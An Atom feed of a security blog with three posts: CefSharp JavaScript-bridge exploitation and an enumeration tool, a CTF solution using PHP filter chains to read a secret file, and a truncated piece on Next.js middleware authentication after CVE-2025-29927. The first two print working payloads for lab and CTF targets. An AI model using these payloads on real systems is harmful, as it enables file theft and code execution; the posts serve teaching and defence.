<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-22T09:18:54+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">The DarkForge Labs Blog</title><subtitle>Welcome to the DarkForge Labs blog! We explore topics that  intrigue us, from security research to upcoming events.  Enjoy your stay! – The DarkForge Labs Team</subtitle><entry><title type="html">CefSharp Enumeration With CefEnum</title><link href="http://localhost:4000/cef/cefsharp/cefenum/thick-client/.net/2025/05/21/CefSharp-Enumeration-With-CefEnum.html" rel="alternate" type="text/html" title="CefSharp Enumeration With CefEnum" /><published>2025-05-21T09:00:00+02:00</published><updated>2025-05-21T09:00:00+02:00</updated><id>http://localhost:4000/cef/cefsharp/cefenum/thick-client/.net/2025/05/21/CefSharp-Enumeration-With-CefEnum</id><content type="html" xml:base="http://localhost:4000/cef/cefsharp/cefenum/thick-client/.net/2025/05/21/CefSharp-Enumeration-With-CefEnum.html"><![CDATA[<h2 id="tldr">TLDR</h2>
<p><a href="https://github.com/cefsharp/CefSharp/">CefSharp</a> is widely embedded in .NET-based Thick-Clients, often without proper hardening or awareness of its security implications. For researchers and red teamers, this creates opportunities for stealthy exploitation, persistence, and even RCE if misconfigurations are identified.</p>

<p>In this post, we explore common misconfigurations and attack vectors encountered during testing. We’re also releasing a new enumeration tool to help you quickly identify and fingerprint CefSharp instances in your engagements.</p>

<p><strong>Download CefEnum</strong>: <a href="https://github.com/darkforge-labs/cefenum">https://github.com/darkforge-labs/cefenum</a></p>

<h2 id="cef">CEF</h2>
<p>Before we discuss CefSharp, let’s look at <a href="https://github.com/chromiumembedded/cef">CEF</a> (Chromium Embedded Framework).</p>

<blockquote>
  <p>Chromium Embedded Framework (CEF). A simple framework for embedding Chromium-based browsers in other applications.
CEF is a BSD-licensed open source project founded by Marshall Greenblatt in 2008 and based on the Google Chromium project. Unlike the Chromium project itself, which focuses mainly on Google Chrome application development, CEF focuses on facilitating embedded browser use cases in third-party applications. CEF insulates the user from the underlying Chromium and Blink code complexity by offering production-quality stable APIs, release branches tracking specific Chromium releases, and binary distributions.</p>
</blockquote>

<ul>
  <li><a href="https://github.com/chromiumembedded/cef">https://github.com/chromiumembedded/cef</a></li>
</ul>

<h2 id="cefsharp">CefSharp</h2>
<p><img src="/assets/images/04fe27e7a409e3c463dec186a49254d49f4d1ea2.png" alt="CefSharp Logo" width="300px" /></p>

<p>What exactly is <a href="https://github.com/cefsharp/CefSharp/">CefSharp</a>?</p>

<blockquote>
  <p>CefSharp lets you embed Chromium in .NET apps. It is a lightweight .NET wrapper around the Chromium Embedded Framework (CEF) by Marshall A. Greenblatt. About 30% of the bindings are written in C++/CLI with the majority of code here is C#. It can be used from C# or VB, or any other CLR language. CefSharp provides both WPF and WinForms web browser control implementations.</p>
</blockquote>

<ul>
  <li><a href="https://github.com/cefsharp/CefSharp/">https://github.com/cefsharp/CefSharp/</a></li>
</ul>

<h2 id="web-based-thick-client">Web Based Thick-Client</h2>
<p>Much like Electron, CefSharp enables developers to build desktop applications using web technologies, tailored specifically for the Windows and .NET ecosystem. Its real power lies in its ability to expose internal .NET objects to client-side JavaScript, creating a bidirectional bridge between the client frontend and the user’s system.</p>

<p>This architecture can allow web pages to interact with privileged system functions, something that, when misconfigured, becomes a valuable entry point for security researchers. It can lead to file access, method invocation, or even command execution directly from the browser context.</p>

<h2 id="attack-scope">Attack Scope</h2>
<p>Finding client-side vulnerabilities like XSS in a Thick-Client may seem unconventional, especially since users don’t interact with the app like a typical browser. But as we’ve seen repeatedly with Electron-based apps, these flaws can lead to severe consequences—and CefSharp is no different. When XSS is combined with CefSharp’s JavaScript bridge to exposed .NET objects, a persistent XSS can quickly escalate into RCE.</p>

<p>Before crafting any payloads, though, you need to understand which objects are exposed to the client/browser front-end via CefSharp.</p>

<h2 id="finding-exposed-objects-with-access-to-the-client-source-code">Finding Exposed Objects, With Access To The Client Source Code</h2>
<p>This is straightforward. According to the CefSharp wiki, there are two methods to register your object with <code class="language-plaintext highlighter-rouge">browser.JavascriptObjectRepository</code>. In both examples below, the exposed object is named <code class="language-plaintext highlighter-rouge">boundAsync</code>, referencing the <code class="language-plaintext highlighter-rouge">BoundObject</code> class. (Note: bindable object names will generally follow camelCase, not PascalCase.)</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//For async object registration (equivalent to the old RegisterAsyncJsObject)</span>
<span class="n">browser</span><span class="p">.</span><span class="n">JavascriptObjectRepository</span><span class="p">.</span><span class="n">Register</span><span class="p">(</span><span class="s">"boundAsync"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">BoundObject</span><span class="p">(),</span> <span class="nb">true</span><span class="p">,</span> <span class="n">BindingOptions</span><span class="p">.</span><span class="n">DefaultBinder</span><span class="p">);</span>
</code></pre></div></div>

<p>And:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">browser</span><span class="p">.</span><span class="n">JavascriptObjectRepository</span><span class="p">.</span><span class="n">ResolveObject</span> <span class="o">+=</span> <span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span> <span class="o">=&gt;</span>
<span class="p">{</span>
	<span class="n">var</span> <span class="n">repo</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">ObjectRepository</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">ObjectName</span> <span class="o">==</span> <span class="s">"boundAsync"</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">BindingOptions</span> <span class="n">bindingOptions</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span> <span class="c1">//Binding options is an optional param, defaults to null</span>
		<span class="n">bindingOptions</span> <span class="o">=</span> <span class="n">BindingOptions</span><span class="p">.</span><span class="n">DefaultBinder</span> <span class="c1">//Use the default binder to serialize values into complex objects</span>
		<span class="n">bindingOptions</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BindingOptions</span> <span class="p">{</span> <span class="n">Binder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyCustomBinder</span><span class="p">()</span> <span class="p">});</span> <span class="c1">//Specify a custom binder</span>
		<span class="n">repo</span><span class="p">.</span><span class="n">NameConverter</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span> <span class="c1">//No CamelCase of Javascript Names</span>
		<span class="c1">//For backwards compatability reasons the default NameConverter doesn't change the case of the objects returned from methods calls.</span>
		<span class="c1">//https://github.com/cefsharp/CefSharp/issues/2442</span>
		<span class="c1">//Use the new name converter to bound object method names and property names of returned objects converted to camelCase</span>
		<span class="n">repo</span><span class="p">.</span><span class="n">NameConverter</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">CamelCaseJavascriptNameConverter</span><span class="p">();</span>
		<span class="n">repo</span><span class="p">.</span><span class="n">Register</span><span class="p">(</span><span class="s">"boundAsync"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">BoundObject</span><span class="p">(),</span> <span class="n">isAsync</span><span class="o">:</span> <span class="nb">true</span><span class="p">,</span> <span class="n">options</span><span class="o">:</span> <span class="n">bindingOptions</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>
<p>From here you simply locate the “BoundObject” class, and inspect what methods are available.</p>

<h2 id="interact-with-the-client">Interact with the client</h2>
<p>If a CefSharp client retrieves a malicious page, that page can bind to the exposed object and invoke its methods directly. We’ve created a vulnerable test application called BadBrowser for you to try this out yourself:</p>

<ul>
  <li><a href="https://github.com/darkforge-labs/badbrowser">https://github.com/darkforge-labs/badbrowser</a>.</li>
</ul>

<p>In the code below, we use <code class="language-plaintext highlighter-rouge">CefSharp.BindObjectAsync("customObject")</code> to bind to <code class="language-plaintext highlighter-rouge">customObject</code> and execute the <code class="language-plaintext highlighter-rouge">WriteFile()</code> method with <code class="language-plaintext highlighter-rouge">window.customObject.WriteFile("test.txt")</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">CefSharp</span><span class="p">.</span><span class="nc">BindObjectAsync</span><span class="p">(</span><span class="dl">"</span><span class="s2">customObject</span><span class="dl">"</span><span class="p">);</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">customObject</span><span class="p">.</span><span class="nc">WriteFile</span><span class="p">(</span><span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>or</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">bindAndRun</span><span class="p">(){</span><span class="nx">CefSharp</span><span class="p">.</span><span class="nc">BindObjectAsync</span><span class="p">(</span><span class="dl">"</span><span class="s2">customObject</span><span class="dl">"</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">customObject</span><span class="p">.</span><span class="nc">WriteFile</span><span class="p">(</span><span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">)}).</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed:</span><span class="dl">"</span><span class="p">,</span><span class="nx">n</span><span class="p">)})}</span><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nf">bindAndRun</span><span class="p">()},</span><span class="mi">2</span><span class="nx">e2</span><span class="p">)});</span>
</code></pre></div></div>

<p>Now, when we view a page containing the above JavaScript in BadBrowser, a file named test.txt is written to <code class="language-plaintext highlighter-rouge">C:/tmp/</code>.</p>

<h2 id="delivering-the-payload-getting-the-client-to-load-your-page">Delivering the Payload (Getting the Client to Load Your Page)</h2>
<p>If you’ve discovered a persistent XSS vulnerability in the client’s portal, you can embed your payload into the page, launch the client, and trigger the XSS as it renders.</p>

<p>If direct navigation is restricted and custom URLs can’t be entered, there’s a common workaround: drag a link to your test page from another browser and drop it into the client window.</p>

<p><img src="/assets/images/28eb4850e5fc5953bd5ad52b663689356606ce33.png" alt="Drag Link Across" /></p>

<h2 id="finding-exposed-objects-without-access-to-the-source-code">Finding Exposed Objects, without access to the source code</h2>
<p>If you’re testing a client without access to its source code, you can use <a href="https://github.com/darkforge-labs/cefenum">CefEnum</a>. This simple tool helps detect CefSharp-based clients and identify .NET objects exposed to JavaScript.</p>

<p>When you launch CefEnum, it starts an HTTP listener on port 9090 (configurable via the -port flag). Upon a client connection, CefEnum first delivers a wordlist to the client, which is stored in the front-end. These words are then used to fuzz and guess exposed object names. The tool includes a default wordlist based on <a href="https://github.com/PortSwigger/param-miner">PortSwigger’s param-miner</a>.</p>

<p>After that, CefEnum checks whether the connecting client is running CefSharp.</p>

<p><img src="/assets/images/743b5ddf541b740b3fe0d7f46e45a2d0c9f4f1e9.png" alt="Client connected" width="500px" /></p>

<p>You can interact directly with the client from the command line. CefEnum will pass messages to the clients over a WebSocket. You can either type JavaScript directly into the console, or use the built-in helper functions to do the work for you.</p>

<p><img src="/assets/images/76b81351e6640094863a96e68eb51d7e0ed55819.png" alt="Client connected" width="500px" /></p>

<h2 id="fuzz">Fuzz</h2>
<p>This is the core feature of CefEnum: it attempts to bind to every object name in the wordlist. For each entry, the page executes <code class="language-plaintext highlighter-rouge">CefSharp.BindObjectAsync("ObjectName")</code> and checks whether the binding was successful using <code class="language-plaintext highlighter-rouge">CefSharp.IsObjectCached(ObjectName)</code>. This process runs at roughly 2,000 attempts per second, and you can expand it by supplying a larger wordlist.</p>

<p>CefEnum also supports common suffixes, which are automatically appended to each wordlist entry and tested as well. These suffixes include:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">commonSuffix</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">Api</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Object</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Class</span><span class="dl">"</span><span class="p">];</span>
</code></pre></div></div>

<p><img src="/assets/images/6cba0ae35d27b05f23223171df494dbb588be540.png" alt="object fuzz" width="500px" /></p>

<p>You can use your own wordlist by specifying it at startup with the <code class="language-plaintext highlighter-rouge">-wordlist=./wl.txt</code> flag.</p>

<h2 id="brute">Brute</h2>
<p>You can also brute-force object names with the <code class="language-plaintext highlighter-rouge">brute</code> command [a-zA-Z] This uses the same detection method as <code class="language-plaintext highlighter-rouge">fuzz</code>, but it’s not recommended as performance drops off quickly, and the process becomes impractical beyond five-character names.</p>

<h2 id="bind">Bind</h2>
<p>Once you’ve discovered an object, use the <code class="language-plaintext highlighter-rouge">bind</code> command to instruct the client to enumerate all available methods/functions via introspection:</p>

<p><img src="/assets/images/7b6b0cf85237943f18ae4f47c3073638eea327a6.png" alt="object bind" width="500px" /></p>

<h2 id="run-within-the-client">Run within the client</h2>
<p>You can also conduct all these attacks from within the client/browser itself if your page is rendered within the client.</p>

<p><img src="/assets/images/8e0f05bd24bf0445c2222af229c2aa06b21f1179.png" alt="Testing within the client" /></p>

<h2 id="interact-with-the-binding">Interact with the binding</h2>
<p>Once you’ve identified an object and successfully enumerated its methods, you can invoke them using:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">objectName</span><span class="p">.</span><span class="nc">MethodName</span><span class="p">(</span><span class="dl">"</span><span class="s2">myparameter</span><span class="dl">"</span><span class="p">)</span><span class="s2">`
</span></code></pre></div></div>

<p>Just replace objectName and methodName with the appropriate values. As seen for BadBrowser’s <code class="language-plaintext highlighter-rouge">cusomObject</code> with the WriteFile() method:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">customObject</span><span class="p">.</span><span class="nc">WriteFile</span><span class="p">(</span><span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="prevention">Prevention</h2>
<p>If your portal is not intended to load content from external domains, implement a strict allowlist of trusted origins. Deny any requests attempting to load resources from outside this list. (Note: This might sound like configuring the CSP, but this list must be enforced within the client’s C# code, not the web server.)</p>

<p>This, however, won’t prevent all attacks. For example, if the portal hosting the backend site contains XSS vulnerabilities, attackers can simply embed their attack payload into the portal itself.</p>

<p>Carefully review the classes you expose to the browser and ensure that only those with minimal, tightly scoped methods are bound.</p>

<p>If you’re unsure or would like a second opinion, book a session with us at DarkForge Labs, we’d be happy to help.</p>

<h2 id="final-words">Final Words</h2>
<p><a href="https://github.com/cefsharp/CefSharp">CefSharp</a> is an excellent project, maintained by a great community. It remains a popular choice for enterprises developing in-house thick-clients.</p>

<p>If there’s a faster or more effective way to enumerate object names that we’ve missed, feel free to submit a PR. Thanks for reading!</p>]]></content><author><name></name></author><category term="CEF" /><category term="CefSharp" /><category term="CefEnum" /><category term="Thick-Client" /><category term=".NET" /><summary type="html"><![CDATA[TLDR CefSharp is widely embedded in .NET-based Thick-Clients, often without proper hardening or awareness of its security implications. For researchers and red teamers, this creates opportunities for stealthy exploitation, persistence, and even RCE if misconfigurations are identified.]]></summary></entry><entry><title type="html">Poem CTF Solution, the PHP Filter Way</title><link href="http://localhost:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem.html" rel="alternate" type="text/html" title="Poem CTF Solution, the PHP Filter Way" /><published>2025-04-04T06:00:00+02:00</published><updated>2025-04-04T06:00:00+02:00</updated><id>http://localhost:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem</id><content type="html" xml:base="http://localhost:4000/ctf/darkforge/phpfilter/2025/04/04/CTF-Poem.html"><![CDATA[<h1 id="darkforge-labs-first-ctf">DarkForge Labs’ First CTF</h1>

<p>First off, huge congratulations to everyone who completed the challenge — and a special shoutout to <a href="https://x.com/et3rnos">et3rnos</a>, the first to solve it and our official winner!</p>

<p>This CTF was inspired by the article <a href="https://swarm.ptsecurity.com/impossible-xxe-in-php/"><em>Impossible XXE in PHP</em></a> by Aleksandr Zhurnakov. If you haven’t read it yet, you’re missing out.</p>

<h2 id="the-challenge">The Challenge</h2>

<p><img src="/assets/images/f90efe340c242d21d9fd2d0c4ce7d48724dcba67.png" alt="The Challenge" /></p>

<p>The challenge was hosted at <a href="https://ctf.darkfor.ge/">https://ctf.darkfor.ge</a> with the source available on our <a href="https://github.com/darkforge-labs/ctf-poem-web">GitHub</a>.</p>

<p>Digging into <a href="https://github.com/darkforge-labs/ctf-poem-web/blob/main/index.php"><code class="language-plaintext highlighter-rouge">index.php</code></a>, we find three interesting things:</p>

<ul>
  <li>The file parses a user-controlled parameter using:<br />
<code class="language-plaintext highlighter-rouge">parse_ini_file($poem_file, true);</code></li>
  <li>The <code class="language-plaintext highlighter-rouge">$poem_file</code> variable is controllable via the <code class="language-plaintext highlighter-rouge">poem_file</code> GET parameter:<br />
<code class="language-plaintext highlighter-rouge">$poem_file = $_GET['poem_file'] ?? '/var/www/html/poem.ini';</code></li>
  <li>The INI key it looks for is <code class="language-plaintext highlighter-rouge">POEM</code>:<br />
<code class="language-plaintext highlighter-rouge">$config['POEM']</code><br />
<em>(Note: INI keys are <strong>case sensitive</strong>.)</em></li>
</ul>

<p>From the <a href="https://github.com/darkforge-labs/ctf-poem-web/blob/main/Dockerfile"><code class="language-plaintext highlighter-rouge">Dockerfile</code></a>, we learn the flag is stored at <code class="language-plaintext highlighter-rouge">/var/secret/flag.txt</code>.</p>

<h2 id="solution">Solution</h2>

<p>Your first instinct might be to try this:<br />
<a href="https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt">https://ctf.darkfor.ge/?poem_file=/var/secret/flag.txt</a></p>

<p>But that won’t work. The flag file doesn’t contain INI-formatted content, and <code class="language-plaintext highlighter-rouge">parse_ini_file()</code> expects a valid format like:</p>

<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">POEM</span> <span class="p">=</span> <span class="s">FLAG_VALUE</span>
</code></pre></div></div>

<p>So, the trick is to <strong>prepend</strong> the necessary INI key to the flag content.</p>

<h2 id="dead-ends">Dead Ends</h2>

<p>If you’re familiar with the modern <a href="https://github.com/ambionics/wrapwrap">wrapwrap</a> technique by <a href="https://x.com/cfreal_">Charles Fol</a>, you might try using that. However, due to server constraints on URL length, you’ll hit a “Requested URI Too Long” error.</p>

<p><img src="/assets/images/6b62b65e86a4665f74c7ca862328fc1cc098ecda.png" alt="URI too long error" /></p>

<h2 id="filters-to-the-rescue">Filters to the Rescue</h2>

<p>It all starts with this legendary post by <a href="https://x.com/gynvael">Gynvael</a> in 2018:<br />
<a href="https://gynvael.coldwind.pl/?id=671">Surprising CTF task solution using php://filter</a></p>

<p>Shortly after this post, <a href="https://x.com/loknop">lolknop</a> took it further with a custom payload generator you can find in this <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Gist</a>.</p>

<p>This is perfect — we can use it to prepend the line <code class="language-plaintext highlighter-rouge">POEM = </code> to the flag content, making it parsable by <code class="language-plaintext highlighter-rouge">parse_ini_file()</code>.</p>

<p>But… there’s a slight snag. Both <code class="language-plaintext highlighter-rouge">POEM =</code> and its base64 form <code class="language-plaintext highlighter-rouge">UE9FTSA9</code> contain characters not supported by lolknop’s script. The workaround? Use a <strong>tab</strong> and remove the space before the <code class="language-plaintext highlighter-rouge">=</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\tPOEM=
</code></pre></div></div>

<p>Which base64-encodes to: <code class="language-plaintext highlighter-rouge">CVBPRU09</code> — a string with characters fully supported by the Gist tooling. Excellent.</p>

<p>This allows us to build a monster filter chain like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php://filter/.../resource=/var/secret/flag.txt
</code></pre></div></div>

<p><em>(Note: Click the link for the full URL)</em></p>

<p><a href="https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.ISO6937.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.1046.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.CP1133.IBM932%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.MAC.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.857.SHIFTJISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.UTF16LE%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.UTF16.EUCTW%7cconvert.iconv.CP1256.UCS2%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.iconv.ISO2022KR.UTF16%7cconvert.iconv.UCS-2LE.UCS-2BE%7cconvert.iconv.TCVN.UCS2%7cconvert.iconv.851.BIG5%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.UTF8.CSISO2022KR%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt">Payload link https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8…|convert.base64-decode/resource=/var/secret/flag.txt</a></p>

<h2 id="easier-payload-generation">Easier Payload Generation</h2>

<p>For a much cleaner experience, use the <a href="https://github.com/synacktiv/php_filter_chain_generator">PHP Filter Chain Generator</a> by <a href="https://x.com/_remsio_">Rémi Matasse</a> of Synacktiv. It already maps most ASCII character to their supported encodings.</p>

<p>Just run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'POEM ='</span>
</code></pre></div></div>

<p>Then replace <code class="language-plaintext highlighter-rouge">resource=</code> with your target file (<code class="language-plaintext highlighter-rouge">/var/secret/flag.txt</code>), and voilà, payload done.</p>

<p><em>(Note: Click the link for the full URL)</em></p>

<p><a href="https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv.UTF8.CSISO2022KR%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.8859_3.UTF16%7cconvert.iconv.863.SHIFT_JISX0213%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.iconv.GBK.SJIS%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L6.UNICODE%7cconvert.iconv.CP1282.ISO-IR-90%7cconvert.iconv.CSA_T500.L4%7cconvert.iconv.ISO_8859-2.ISO-IR-103%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.L5.UTF-32%7cconvert.iconv.ISO88594.GB13000%7cconvert.iconv.CP950.SHIFT_JISX0213%7cconvert.iconv.UHC.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.CSIBM1161.UNICODE%7cconvert.iconv.ISO-IR-156.JOHAB%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.IBM860.UTF16%7cconvert.iconv.ISO-IR-143.ISO2022CNEXT%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.iconv.INIS.UTF16%7cconvert.iconv.CSIBM1133.IBM943%7cconvert.base64-decode%7cconvert.base64-encode%7cconvert.iconv.UTF8.UTF7%7cconvert.base64-decode/resource=/var/secret/flag.txt">https://ctf.darkfor.ge/?poem_file=php://filter/convert.iconv…|convert.base64-encode|…|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/secret/flag.txt</a></p>

<p><img src="/assets/images/3cc56575fc80a023f712eadc961786902d7b0d89.png" alt="Flag Retrieved" /></p>

<p>For deeper understanding, I highly recommend reading their full post:<br />
<a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it"><em>PHP Filters Chain: What is it and how to use it</em></a></p>

<p>You can also explore <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> by <a href="https://github.com/wupco">Wupco</a> for fuzzing and payload crafting.</p>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>This challenge was all about exploring edge-case behavior in PHP’s obscure corners and the community’s creativity in weaponizing those quirks. The linked articles are truly mind-bending and absolutely worth a read.</p>

<p>Big thanks to everyone who played, and stay tuned, the <a href="https://darkforge.io">DarkForge</a> team has a lot more coming your way.</p>]]></content><author><name></name></author><category term="CTF" /><category term="DarkForge" /><category term="PHPFilter" /><summary type="html"><![CDATA[DarkForge Labs’ First CTF]]></summary></entry><entry><title type="html">Authentication at the Edge</title><link href="http://localhost:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge.html" rel="alternate" type="text/html" title="Authentication at the Edge" /><published>2025-04-01T09:00:00+02:00</published><updated>2025-04-01T09:00:00+02:00</updated><id>http://localhost:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge</id><content type="html" xml:base="http://localhost:4000/next.js/middleware/authentication/2025/04/01/Authentication-At-The-Edge.html"><![CDATA[<h1 id="cve-2025-29927">CVE-2025-29927</h1>

<p>When <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">CVE-2025-29927</a> dropped, it lit up the infosec world. An authentication bypass in Next.js middleware raised urgent questions not just about the vulnerability itself but about architectural choices.</p>

<p><em>Should we be enforcing authentication in the middleware?</em></p>

<p>It’s a question that’s polarized developers and security engineers alike. <a href="https://x.com/moopinger/status/1906281539815579790">Our own X poll came back split almost exactly down the middle.</a></p>

<p>But after digging into the excellent write-ups from <a href="https://www.neoxs.me/blog/critical-nextjs-middleware-vulnerability-cve-2025-29927-authentication-bypass">neox</a>, <a href="https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927">Assetnote</a>, <a href="https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/">JFrog</a>, and <a href="https://www.rapid7.com/blog/post/2025/03/25/etr-notable-vulnerabilities-in-next-js-cve-2025-29927/">Rapid7</a> — we realized something:</p>

<p>We’ve been asking the wrong question.</p>

<h2 id="the-real-question-should-all-your-authentication-run-in-nextjs-middleware">The Real Question: Should <em>All</em> Your Authentication Run in <em>Next.js</em> Middleware?</h2>

<p>That’s the actual crux. And the answer is a resounding <span class="underline">no</span>.</p>

<p>Middleware in Next.js, especially in the App Router, runs in an <strong>edge runtime</strong>. That means it operates in a different environment than your backend or API routes. It’s fast, global, and lightweight. But it also has real limitations:</p>

<ul>
  <li><a href="https://nextjs.org/docs/app/building-your-application/rendering/edge-and-nodejs-runtimes">The edge runtime runs on a separate more limited Node runtime</a></li>
  <li><a href="https://clerk.com/blog/what-is-middleware-in-nextjs">Limited access to full request bodies</a></li>
</ul>

<p>Compare this to <code class="language-plaintext highlighter-rouge">Express.js</code> middleware, which runs in a Node.js server with full control over the request lifecycle. Same word <em>middleware</em> but completely different realities.</p>

<p>That distinction matters. Because when you put critical auth logic in Next.js edge middleware, you’re betting your security on a layer that wasn’t built for that burden.</p>

<p>Even <strong>Vercel</strong> says as much in their <a href="https://vercel.com/blog/postmortem-on-next-js-middleware-bypass">postmortem</a>:</p>

<blockquote>
  <p>“We do not recommend Middleware to be the sole method of protecting routes in your application”</p>
</blockquote>

<h2 id="so-what-is-edge-based-middleware-good-for">So What Is Edge Based Middleware Good For?</h2>

<p>Used correctly, Next.js middleware can still be a powerful tool — especially for <strong>coarse-grained access control</strong>. Think of it like the lobby guard, not the vault door.</p>

<ul>
  <li><strong>Use it to block unauthenticated users</strong> from public routes</li>
  <li><strong>Redirect users to login</strong> if they’re missing a session</li>
